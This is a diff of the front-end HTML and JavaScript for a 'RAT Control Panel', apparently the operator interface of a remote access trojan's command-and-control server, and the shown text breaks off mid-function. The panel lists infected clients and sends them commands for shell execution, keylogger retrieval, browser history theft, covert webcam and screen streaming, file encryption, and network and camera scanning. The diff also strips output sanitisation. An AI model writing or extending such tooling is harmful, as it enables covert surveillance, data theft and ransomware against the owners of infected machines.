@@ -1,307 +1,1429 @@
 <!DOCTYPE html>
-<html lang="de" class="dark">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <link rel="icon" type="image/x-icon" href="favicon.ico" />
   <title>RAT Control Panel</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#111827">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
   <style>
-    :root { --primary: #3b82f6; --darker: #111827; }
-    body { background-color: var(--darker); font-family: 'Inter', sans-serif; }
-    .glass-effect { background: rgba(31, 41, 55, 0.5); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
-    .client-card.selected { box-shadow: 0 0 0 2px var(--primary), 0 0 10px rgba(59, 130, 246, 0.5); }
-    .status-dot { animation: pulse 2s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
-    .command-input:focus { border-color: var(--primary); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
-    .output-area { background-color: rgba(17, 24, 39, 0.8); font-family: 'Menlo', 'Monaco', monospace; }
-    .scrollbar-thin { scrollbar-width: thin; scrollbar-color: #4b5563 transparent; }
-    .scrollbar-thin::-webkit-scrollbar { width: 6px; }
-    .scrollbar-thin::-webkit-scrollbar-track { background: transparent; }
-    .scrollbar-thin::-webkit-scrollbar-thumb { background-color: #4b5563; border-radius: 3px; }
-    #sidebar { transition: transform 0.3s ease-in-out; }
-    .quick-action { background-color: #374151; padding: 4px 8px; border-radius: 6px; font-size: 0.8rem; transition: background-color 0.2s; }
-    .quick-action:hover { background-color: #4b5563; }
-    @media (max-width: 767px) {
-      #sidebar {
-        position: fixed; top: 0; left: 0; height: 100%;
-        transform: translateX(-100%); z-index: 40;
+    :root {
+      --primary: #3b82f6;
+      --secondary: #10b981;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --dark: #1f2937;
+      --darker: #111827;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    
+    .glass-effect {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    #client-list > div {
+      word-break: break-all;
+    }
+    
+    .client-card {
+      transition: all 0.3s ease;
+    }
+    
+    .client-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+    
+    .client-card.selected {
+      border-color: var(--primary);
+      box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
+    }
+    
+    .status-dot {
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    
+    .command-input {
+      background: rgba(31, 41, 55, 0.8);
+      border: 1px solid rgba(75, 85, 99, 0.25);
+    }
+    
+    .command-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+    
+    .output-area {
+      background: rgba(17, 24, 39, 0.9);
+      font-family: 'Monaco', 'Menlo', monospace;
+    }
+    
+    .suggestion-item {
+      transition: background-color 0.2s ease;
+    }
+    
+    .suggestion-item:hover,
+    .suggestion-item.selected {
+      background-color: rgba(59, 130, 246, 0.2);
+    }
+    
+    .webcam-container, .screen-container {
+      width: 100%;
+      max-height: 70vh;
+    }
+    
+    .notification {
+      animation: slideInRight 0.25s ease-out;
+    }
+    
+    @keyframes slideInRight {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
       }
-      #sidebar.open { transform: translateX(0); }
-      #sidebar-overlay {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background-color: rgba(0,0,0,0.5); z-index: 39;
+      to {
+        transform: translateX(0);
+        opacity: 1;
       }
+    }
+    
+    .connection-indicator {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 1000;
+    }
+    
+    .notifications-container {
+      position: fixed;
+      top: 80px;
+      right: 20px;
+      z-index: 999;
+    }
+    
+    .scrollbar-thin {
+      scrollbar-width: thin;
+      scrollbar-color: rgba(156, 163, 175, 0.5) transparent;
+    }
+    
+    .scrollbar-thin::-webkit-scrollbar {
+      width: 6px;
+    }
+    
+    .scrollbar-thin::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    
+    .scrollbar-thin::-webkit-scrollbar-thumb {
+      background-color: rgba(156, 163, 175, 0.5);
+      border-radius: 3px;
+    }
+
+    #server-stats-content > div {
+      overflow: hidden;
+    }
+
+    .stat-card-wrapper {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .stat-card-title {
+      font-size: 0.8rem;
+    }
+
+    .stat-card-value {
+      font-size: 1.2rem;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
   </style>
 </head>
-<body class="text-gray-200 min-h-screen">
+<body class="text-gray-100 min-h-screen">
+  <!-- Connection Status Indicator -->
+  <div id="connection-indicator" class="connection-indicator">
+    <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
+      <i class="fas fa-wifi mr-2"></i>Connecting...
+    </div>
+  </div>
 
-  <div id="login-overlay" class="fixed inset-0 bg-gray-900 bg-opacity-80 flex items-center justify-center z-50">
-    <div class="glass-effect rounded-xl p-8 w-full max-w-sm mx-4">
-      <h1 class="text-3xl font-bold text-white text-center mb-6">Control Panel</h1>
+  <!-- Login Overlay -->
+  <div id="login-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+    <div class="glass-effect rounded-2xl p-8 w-full max-w-md mx-4">
+      <div class="text-center mb-6">
+        <i class="fas fa-shield-alt text-4xl text-blue-400 mb-4"></i>
+        <h1 class="text-3xl font-bold text-white mb-2">RAT Control Panel</h1>
+        <p class="text-gray-300">Secure access required</p>
+      </div>
+      
       <form id="login-form" class="space-y-4">
-        <input type="text" id="login-username" required placeholder="Benutzername" class="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
-        <input type="password" id="login-password" required placeholder="Passwort" class="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
-        <div id="login-error" class="text-red-400 text-sm text-center hidden h-4"></div>
-        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg transition">Login</button>
+        <div>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Username</label>
+          <input type="text" id="login-username" required
+                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
+        </div>
+        
+        <div>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Password</label>
+          <input type="password" id="login-password" required
+                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
+        </div>
+        
+        <div id="login-error" class="text-red-400 text-sm hidden"></div>
+        
+        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
+          <i class="fas fa-sign-in-alt mr-2"></i>Login
+        </button>
       </form>
     </div>
   </div>
 
-  <div id="main-app" class="hidden">
-    <div id="sidebar-overlay" class="hidden md:hidden" onclick="toggleSidebar()"></div>
-    <div class="flex flex-col md:flex-row min-h-screen">
-      <aside id="sidebar" class="w-72 bg-gray-900 p-4 flex flex-col md:relative flex-shrink-0">
-        <h2 class="text-xl font-bold text-white mb-4">Clients (<span id="client-count">0</span>)</h2>
+  <!-- Main Application -->
+  <div id="main-app" class="hidden min-h-screen flex">
+    <!-- Sidebar - Client List -->
+    <div class="w-80 bg-gray-800 bg-opacity-50 p-6 overflow-y-auto scrollbar-thin">
+      <div class="mb-6">
+        <h2 class="text-xl font-bold text-white mb-4 flex items-center">
+          <i class="fas fa-desktop mr-3 text-blue-400"></i>
+          Connected Clients
+          <span id="client-count" class="ml-auto bg-blue-600 text-white text-xs px-2 py-1 rounded-full">0</span>
+        </h2>
+        
+        <!-- Client Actions -->
         <div class="flex gap-2 mb-4">
-          <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm"><i class="fas fa-sync-alt"></i></button>
-          <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg text-sm">Alle</button>
+          <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
+            <i class="fas fa-sync-alt mr-2"></i>Refresh
+          </button>
+          <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
+            <i class="fas fa-check-double mr-2"></i>All
+          </button>
         </div>
-        <div id="client-list" class="space-y-2 overflow-y-auto scrollbar-thin flex-1">
-          <p class="text-gray-400 text-center py-8">Warte auf Clients...</p>
+      </div>
+      
+      <!-- Client List -->
+      <div id="client-list" class="space-y-3">
+        <div class="text-center text-gray-400 py-8">
+          <i class="fas fa-satellite-dish text-3xl mb-3"></i>
+          <p>No clients connected</p>
+          <p class="text-sm">Waiting for connections...</p>
         </div>
-      </aside>
+      </div>
+    </div>
 
-      <main class="flex-1 flex flex-col">
-        <header class="bg-gray-800/50 p-3 border-b border-gray-700 flex items-center justify-between">
-          <button id="menu-toggle" class="md:hidden p-2 rounded-md hover:bg-gray-700"><i class="fas fa-bars text-xl"></i></button>
-          <div class="text-sm text-gray-400">Ausgewählt: <span id="selected-count">0</span></div>
-          <div id="connection-status" class="px-3 py-1 rounded-full text-xs font-medium bg-yellow-500 text-yellow-900">Verbinde...</div>
-        </header>
-
-        <div class="flex-1 flex flex-col lg:flex-row p-2 md:p-4 gap-4 overflow-hidden">
-          <div class="flex-1 flex flex-col gap-4">
-            <div class="bg-gray-800/50 rounded-lg p-3">
-              <div class="flex gap-2">
-                <input type="text" id="command-input" placeholder="Befehl eingeben..." class="command-input w-full px-4 py-2 rounded-lg text-white bg-gray-900 border border-gray-700 focus:outline-none">
-                <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2 rounded-lg font-medium"><i class="fas fa-paper-plane"></i></button>
-              </div>
-              <div class="flex gap-2 mt-2 flex-wrap">
-                <button class="quick-action" data-command="/systeminfo">Info</button>
-                <button class="quick-action" data-command="/screenshot">Screenshot</button>
-                <button class="quick-action" data-command="/ls">Dateien</button>
-                <button class="quick-action" data-command="/screenstream_start">Bildschirm</button>
-              </div>
-            </div>
-            <div class="output-area flex-1 p-3 rounded-lg overflow-y-auto scrollbar-thin text-sm" id="output-area">
-              <p class="text-gray-500 text-center py-8">Bereit für Befehle...</p>
-            </div>
+    <!-- Main Panel -->
+    <div class="flex-1 flex flex-col">
+      <!-- Header -->
+      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
+        <div class="flex items-center justify-between">
+          <div>
+            <h1 class="text-2xl font-bold text-white">RAT Control Panel</h1>
+            <p class="text-gray-300 text-sm">Selected Clients: <span id="selected-count">0</span></p>
           </div>
-
-          <div class="w-full lg:w-96 bg-gray-800/50 rounded-lg p-3 flex flex-col flex-shrink-0">
-            <h3 class="text-lg font-semibold text-white mb-2">Live Media</h3>
-            <div id="media-container" class="flex-1 flex items-center justify-center bg-black rounded">
-                <div id="media-placeholder" class="text-gray-500">Keine Medien</div>
-                <img id="screenshot-img" class="hidden max-h-full max-w-full" alt="Screenshot">
-                <canvas id="screen-canvas" class="hidden max-h-full max-w-full"></canvas>
-            </div>
-            <button id="stop-stream-btn" class="hidden w-full mt-2 bg-red-600 hover:bg-red-700 text-white py-1 rounded">Stream stoppen</button>
+          <div class="flex items-center gap-4">
+            <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-chart-bar mr-2"></i>Server Stats
+            </button>
+            <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-trash mr-2"></i>Clear
+            </button>
+            <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-download mr-2"></i>Export
+            </button>
           </div>
         </div>
-      </main>
+      </div>
+
+      <!-- Command Input Section -->
+      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
+        <div class="flex gap-3 relative">
+          <div class="flex-1 relative">
+            <input type="text" id="command-input" placeholder="Enter command... (/ for suggestions)"
+                   class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
+            
+            <!-- Command Suggestions -->
+            <div id="command-suggestions" class="absolute top-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mt-1 max-h-64 overflow-y-auto z-10 hidden">
+              <!-- Suggestions will be populated by JavaScript -->
+            </div>
+          </div>
+          
+          <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium transition duration-200">
+            <i class="fas fa-paper-plane mr-2"></i>Send
+          </button>
+          
+          <input type="file" id="file-upload" class="hidden" multiple>
+          <button id="upload-btn" class="bg-green-600 hover:bg-green-700 text-white px-4 py-3 rounded-lg transition duration-200">
+            <i class="fas fa-upload"></i>
+          </button>
+        </div>
+        
+        <!-- Quick Actions -->
+        <div class="flex gap-2 mt-3 flex-wrap">
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/systeminfo">
+            <i class="fas fa-info-circle mr-1"></i>System Info
+          </button>
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenshot">
+            <i class="fas fa-camera mr-1"></i>Screenshot
+          </button>
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
+            <i class="fas fa-folder mr-1"></i>List Files
+          </button>
+          <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/process_list">
+            <i class="fas fa-tasks mr-1"></i>Processes
+          </button>
+          <button class="quick-action bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_info">
+            <i class="fas fa-network-wired mr-1"></i>Network
+          </button>
+          <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
+            <i class="fas fa-desktop mr-1"></i>Screen Stream
+          </button>
+          <button class="quick-action bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/webcam_start">
+            <i class="fas fa-video mr-1"></i>Webcam
+          </button>
+          <button class="quick-action bg-orange-600 hover:bg-orange-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/history">
+            <i class="fas fa-history mr-1"></i>Browser History
+          </button>
+        </div>
+      </div>
+
+      <!-- Output and Media Section -->
+      <div class="flex-1 flex flex-col lg:flex-row">
+        <!-- Output Area -->
+        <div class="flex-1 flex flex-col p-4">
+          <div class="flex items-center justify-between mb-3">
+            <h3 class="text-lg font-semibold text-white">Output</h3>
+            <button id="copy-output" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm transition duration-100">
+              <i class="fas fa-copy mr-2"></i>Copy
+            </button>
+          </div>
+          
+          <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed">
+            <div class="text-gray-400 text-center py-5">
+              <i class="fas fa-terminal text-3xl mb-3"></i>
+              <p>Ready for commands...</p>
+              <p class="text-xs mt-2">Use / for command suggestions</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Media Area (Screenshots, Webcam, Screen Sharing) -->
+        <div class="w-full lg:w-96 p-4">
+          <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 h-full">
+            <h3 class="text-lg font-semibold text-white mb-3">Live Media</h3>
+            
+            <!-- Screenshot Display -->
+            <div id="screenshot-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Screenshot</span>
+                <button id="download-screenshot" class="text-blue-400 hover:text-blue-300 text-sm">
+                  <i class="fas fa-download"></i>
+                </button>
+              </div>
+              <img id="screenshot-img" class="w-full rounded-lg border border-gray-600" alt="Screenshot">
+            </div>
+            
+            <!-- Screen Stream -->
+            <div id="screen-stream-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Screen Stream</span>
+                <button id="stop-screen-stream" class="text-red-400 hover:text-red-300 text-sm">
+                  <i class="fas fa-stop-circle mr-1"></i>Stop
+                </button>
+              </div>
+              <canvas id="screen-canvas" class="w-full rounded-lg border border-gray-600 screen-container"></canvas>
+              <div id="screen-status" class="text-xs text-gray-400 mt-2 text-center"></div>
+            </div>
+            
+            <!-- Webcam Stream -->
+            <div id="webcam-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Webcam Stream</span>
+                <button id="stop-webcam" class="text-red-400 hover:text-red-300 text-sm">
+                  <i class="fas fa-stop-circle mr-1"></i>Stop
+                </button>
+              </div>
+              <canvas id="webcam-canvas" class="w-full rounded-lg border border-gray-600 webcam-container"></canvas>
+              <div id="webcam-status" class="text-xs text-gray-400 mt-2 text-center"></div>
+            </div>
+            
+            <!-- Placeholder when no media -->
+            <div id="media-placeholder" class="text-center text-gray-400 py-8">
+              <i class="fas fa-image text-3xl mb-3"></i>
+              <p>No live media</p>
+              <p class="text-xs">Screenshots and streams appear here</p>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
 
-  <div id="notifications" class="fixed top-4 right-4 z-50 space-y-2"></div>
+  <!-- Server Stats Modal -->
+  <div id="server-stats-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="glass-effect rounded-2xl p-6 w-full max-w-4xl mx-4 max-h-[90vh] overflow-y-auto">
+      <div class="flex items-center justify-between mb-6">
+        <h2 class="text-2xl font-bold text-white">Server Statistics</h2>
+        <button id="close-stats-modal" class="text-gray-400 hover:text-white text-2xl">
+          <i class="fas fa-times"></i>
+        </button>
+      </div>
+      
+      <div id="server-stats-content" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
+        <!-- Stats content will be populated by JavaScript -->
+      </div>
+      
+      <div class="mt-6 text-center">
+        <button id="refresh-stats" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition duration-100">
+          <i class="fas fa-sync-alt mr-2"></i>Refresh
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Server Stats Modal -->
+  <div id="server-stats-loading" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="text-white">Loading server statistics...</div>
+  </div>
+
+  <!-- Notifications Container -->
+  <div id="notifications" class="notifications-container space-y-2"></div>
 
   <script>
-    let ws = null, selectedClients = new Set(), isAuthenticated = false, reconnectAttempts = 0;
-    const $ = (id) => document.getElementById(id);
+    // Global Variables
+    let ws = null;
+    let selectedClients = new Set();
+    let lastClientList = [];
+    let commandHistory = [];
+    let historyIndex = -1;
+    let isAuthenticated = false;
+    let reconnectAttempts = 0;
+    let maxReconnectAttempts = 5;
 
-    function showNotification(message, type = 'info') {
-      const colors = { success: 'bg-green-500', error: 'bg-red-500', info: 'bg-blue-500' };
-      const el = document.createElement('div');
-      el.className = `notification ${colors[type]} text-white px-4 py-2 rounded-lg shadow-lg text-sm`;
-      el.textContent = message;
-      $('notifications').appendChild(el);
-      setTimeout(() => el.remove(), 3000);
+    // Command suggestions
+    const commands = [
+      { cmd: '/help', desc: 'Show available commands' },
+      { cmd: '/exec', desc: 'Execute shell command' },
+      { cmd: '/screenshot', desc: 'Take screenshot' },
+      { cmd: '/download', desc: 'Download file' },
+      { cmd: '/upload', desc: 'Upload file' },
+      { cmd: '/ls', desc: 'List directory contents' },
+      { cmd: '/cd', desc: 'Change directory' },
+      { cmd: '/systeminfo', desc: 'Show system information' },
+      { cmd: '/history', desc: 'Show browser history' },
+      { cmd: '/keylogger', desc: 'Show keylogger data' },
+      { cmd: '/screenstream_start', desc: 'Start screen streaming' },
+      { cmd: '/screenstream_stop', desc: 'Stop screen streaming' },
+      { cmd: '/webcam_start', desc: 'Start webcam stream' },
+      { cmd: '/webcam_stop', desc: 'Stop webcam stream' },
+      { cmd: '/encrypt', desc: 'Encrypt files/folders' },
+      { cmd: '/decrypt', desc: 'Decrypt files/folders' },
+      { cmd: '/scan_cameras', desc: 'Scan for network cameras' },
+      { cmd: '/process_list', desc: 'Show running processes' },
+      { cmd: '/kill_process', desc: 'Kill process by PID' },
+      { cmd: '/network_info', desc: 'Show network information' },
+      { cmd: '/network_scan', desc: 'Scan network for hosts' },
+      { cmd: '/shutdown', desc: 'Shutdown system' },
+      { cmd: '/restart', desc: 'Restart system' }
+    ];
+
+    // DOM Elements
+    const loginOverlay = document.getElementById('login-overlay');
+    const mainApp = document.getElementById('main-app');
+    const loginForm = document.getElementById('login-form');
+    const loginError = document.getElementById('login-error');
+    const connectionStatus = document.getElementById('connection-status');
+    const clientList = document.getElementById('client-list');
+    const clientCount = document.getElementById('client-count');
+    const selectedCount = document.getElementById('selected-count');
+    const commandInput = document.getElementById('command-input');
+    const commandSuggestions = document.getElementById('command-suggestions');
+    const sendCommand = document.getElementById('send-command');
+    const outputArea = document.getElementById('output-area');
+    const fileUpload = document.getElementById('file-upload');
+    const uploadBtn = document.getElementById('upload-btn');
+    const screenshotContainer = document.getElementById('screenshot-container');
+    const screenshotImg = document.getElementById('screenshot-img');
+    const screenStreamContainer = document.getElementById('screen-stream-container');
+    const screenCanvas = document.getElementById('screen-canvas');
+    const screenStatus = document.getElementById('screen-status');
+    const webcamContainer = document.getElementById('webcam-container');
+    const webcamCanvas = document.getElementById('webcam-canvas');
+    const webcamStatus = document.getElementById('webcam-status');
+    const mediaPlaceholder = document.getElementById('media-placeholder');
+    const serverStatsBtn = document.getElementById('server-stats-btn');
+    const serverStatsModal = document.getElementById('server-stats-modal');
+    const closeStatsModal = document.getElementById('close-stats-modal');
+    const serverStatsLoading = document.getElementById('server-stats-loading');
+    const serverStatsContent = document.getElementById('server-stats-content');
+    const refreshStats = document.getElementById('refresh-stats');
+
+    // Utility Functions
+    function showNotification(message, type = 'info', duration = 3000) {
+      const notification = document.createElement('div');
+      const colors = {
+        success: 'bg-green-500',
+        error: 'bg-red-500',
+        warning: 'bg-yellow-500',
+        info: 'bg-blue-500'
+      };
+      
+      notification.className = `notification ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg max-w-sm`;
+      notification.innerHTML = `
+        <div class="flex items-center justify-between">
+          <span>${message}</span>
+          <button onclick="this.parentElement.parentElement.remove()" class="ml-3 text-white hover:text-gray-200">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+      `;
+      
+      document.getElementById('notifications').appendChild(notification);
+      
+      if (duration > 0) {
+        setTimeout(() => notification.remove(), duration);
+      }
     }
 
-    function updateConnectionStatus(status) {
-      const statuses = {
-        connected: { text: 'Verbunden', class: 'bg-green-500 text-green-900' },
-        connecting: { text: 'Verbinde...', class: 'bg-yellow-500 text-yellow-900' },
-        disconnected: { text: 'Getrennt', class: 'bg-red-500 text-red-900' },
-      };
-      $('connection-status').textContent = statuses[status].text;
-      $('connection-status').className = `px-3 py-1 rounded-full text-xs font-medium ${statuses[status].class}`;
+    function updateConnectionStatus(status, message) {
+      const statusElement = connectionStatus;
+      statusElement.className = 'px-3 py-2 rounded-full text-sm font-medium';
+      
+      switch (status) {
+        case 'connected':
+          statusElement.className += ' bg-green-500 text-green-900';
+          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Connected';
+          break;
+        case 'connecting':
+          statusElement.className += ' bg-yellow-500 text-yellow-900';
+          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Connecting...';
+          break;
+        case 'disconnected':
+          statusElement.className += ' bg-red-500 text-red-900';
+          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Disconnected';
+          break;
+        case 'error':
+          statusElement.className += ' bg-red-600 text-red-100';
+          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Error';
+          break;
+      }
     }
 
     function logOutput(message, type = 'info') {
-      const colors = { info: 'text-gray-300', error: 'text-red-400', command: 'text-blue-400' };
-      const entry = document.createElement('div');
-      entry.className = `mb-2 p-1 rounded ${colors[type]}`;
-      const sanitizedMessage = message.replace(/</g, "&lt;").replace(/>/g, "&gt;");
-      entry.innerHTML = `<span class="text-gray-500 mr-2">[${new Date().toLocaleTimeString()}]</span> <pre class="inline-block whitespace-pre-wrap">${sanitizedMessage}</pre>`;
-      if ($('output-area').innerHTML.includes("Bereit für Befehle")) $('output-area').innerHTML = '';
-      $('output-area').appendChild(entry);
-      $('output-area').scrollTop = $('output-area').scrollHeight;
+      const timestamp = new Date().toLocaleTimeString();
+      const logEntry = document.createElement('div');
+      logEntry.className = 'mb-2 p-2 rounded';
+      
+      const colors = {
+        info: 'text-gray-300',
+        success: 'text-green-400',
+        error: 'text-red-400',
+        warning: 'text-yellow-400',
+        command: 'text-blue-400'
+      };
+      
+      logEntry.className += ` ${colors[type]}`;
+      logEntry.innerHTML = `<span class="text-gray-500 text-xs">[${timestamp}]</span> ${message}`;
+      
+      outputArea.appendChild(logEntry);
+      outputArea.scrollTop = outputArea.scrollHeight;
+      
+      // Remove placeholder
+      const placeholder = outputArea.querySelector('.text-center.py-8');
+      if (placeholder) placeholder.remove();
     }
 
-    function toggleSidebar() {
-      $('sidebar').classList.toggle('open');
-      $('sidebar-overlay').classList.toggle('hidden');
-    }
-
+    // Authentication
     async function login(username, password) {
       try {
         const response = await fetch('/login', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify({ username, password })
         });
+        
         const data = await response.json();
-        if (!response.ok) throw new Error(data.detail || 'Login fehlgeschlagen');
-        localStorage.setItem('rat_token', data.token);
-        isAuthenticated = true;
-        $('login-overlay').classList.add('hidden');
-        $('main-app').classList.remove('hidden');
-        connectWebSocket();
+        
+        if (response.ok && data.token) {
+          localStorage.setItem('rat_token', data.token);
+          isAuthenticated = true;
+          loginOverlay.classList.add('hidden');
+          mainApp.classList.remove('hidden');
+          connectWebSocket();
+          showNotification('Successfully logged in!', 'success');
+          return true;
+        } else {
+          throw new Error(data.error || 'Login fehlgeschlagen');
+        }
       } catch (error) {
-        $('login-error').textContent = error.message;
-        $('login-error').classList.remove('hidden');
+        loginError.textContent = error.message;
+        loginError.classList.remove('hidden');
+        showNotification(error.message, 'error');
+        return false;
       }
     }
 
+    // WebSocket Connection
     function connectWebSocket() {
       const token = localStorage.getItem('rat_token');
-      if (!token) return;
-      updateConnectionStatus('connecting');
-      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-      ws = new WebSocket(`${protocol}//${location.host}/ws?token=${token}`);
-      
-      ws.onopen = () => { updateConnectionStatus('connected'); reconnectAttempts = 0; };
-      ws.onmessage = handleWebSocketMessage;
-      ws.onclose = (event) => {
-        updateConnectionStatus('disconnected');
-        if (event.code === 4401) { localStorage.removeItem('rat_token'); location.reload(); }
-        else if (reconnectAttempts < 5) { reconnectAttempts++; setTimeout(connectWebSocket, 3000); }
-      };
-      ws.onerror = () => updateConnectionStatus('disconnected');
-    }
-
-    function handleWebSocketMessage(event) {
-        const data = JSON.parse(event.data);
-        switch (data.type) {
-            case 'client_list': updateClientList(data.clients || []); break;
-            case 'command_output': logOutput(data.output, 'info'); break;
-            case 'screenshot': displayMedia('screenshot', data.data); break;
-            case 'screen_frame': displayMedia('screen_frame', data.data); break;
-            case 'error': logOutput(data.message, 'error'); break;
-            default: console.log("Unhandled message:", data);
-        }
-    }
-
-    function updateClientList(clients) {
-      const listEl = $('client-list');
-      listEl.innerHTML = '';
-      $('client-count').textContent = clients.length;
-      if (clients.length === 0) {
-        listEl.innerHTML = '<p class="text-gray-400 text-center py-8">Warte auf Clients...</p>';
+      if (!token) {
+        console.log('No token available, showing login');
+        showLogin();
         return;
       }
-      clients.forEach(client => {
-        const osIcon = client.os.toLowerCase().includes('win') ? 'fab fa-windows' : 'fab fa-linux';
-        const div = document.createElement('div');
-        div.className = `client-card glass-effect p-3 rounded-lg cursor-pointer ${selectedClients.has(client.id) ? 'selected' : ''}`;
-        div.dataset.clientId = client.id;
-        div.innerHTML = `
-          <div class="flex items-center justify-between">
-            <div class="flex items-center overflow-hidden">
-              <div class="status-dot w-2.5 h-2.5 bg-green-400 rounded-full mr-3 flex-shrink-0"></div>
-              <i class="${osIcon} text-lg mr-2"></i>
-              <span class="font-medium text-white truncate">${client.hostname}</span>
-            </div>
-            ${selectedClients.has(client.id) ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
+      
+      updateConnectionStatus('connecting');
+      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const wsUrl = `${protocol}//${location.host}/ws?token=${encodeURIComponent(token)}`;
+      
